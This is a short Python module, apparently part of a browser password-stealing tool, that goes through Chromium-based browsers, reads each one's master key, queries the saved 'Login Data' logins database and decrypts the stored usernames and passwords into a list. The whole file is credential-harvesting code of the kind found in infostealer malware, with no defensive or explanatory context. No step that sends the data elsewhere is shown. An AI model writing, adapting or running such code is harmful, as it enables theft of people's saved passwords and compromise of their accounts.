
# Import modules
from . import GetMasterKey, FetchDataBase, DecryptValue, GetBrowsers

""" Fetch passwords from chromium based browsers """
def Get():
    global credentials
    credentials = []
    for browser in GetBrowsers():
        master_key = GetMasterKey(browser)
        database = FetchDataBase(browser + "\\Login Data", "SELECT action_url, username_value, password_value FROM logins")
        for row in database:
            password = {
                "hostname": row[0],
                "username": row[1],
                "password": DecryptValue(row[2], master_key)
            }
            credentials.append(password)

    return credentials
